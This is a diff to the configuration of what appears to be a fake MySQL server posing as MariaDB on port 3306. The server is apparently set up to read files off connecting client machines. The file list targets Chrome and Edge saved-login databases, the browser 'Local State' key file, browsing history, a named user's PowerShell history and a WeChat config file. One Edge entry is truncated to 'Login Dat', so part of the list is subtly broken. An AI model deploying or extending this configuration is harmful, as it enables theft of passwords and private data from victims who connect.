@@ -2,20 +2,23 @@ host: 0.0.0.0
 port: 3306
 version_string: "5.6.12-MariaDB"
 
-file_list: [
-  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
-  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data",
-  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences",
-  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks",
-  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
-  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
+file_list: [ [
   "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
   "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data",
   "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences",
   "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks",
   "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
   "C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
-]
+], [
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Dat",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Preferences",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
+  "C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History",
+],
+  [ "C:\\Users\\kim\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt" ],
+  [ "C:\\Users\\{username}\\Documents\\WeChat Files\\All Users\\config\\config.data" ] ]
 save_path: ./fake_mysql_read
 always_read: false
 from_database_name: false
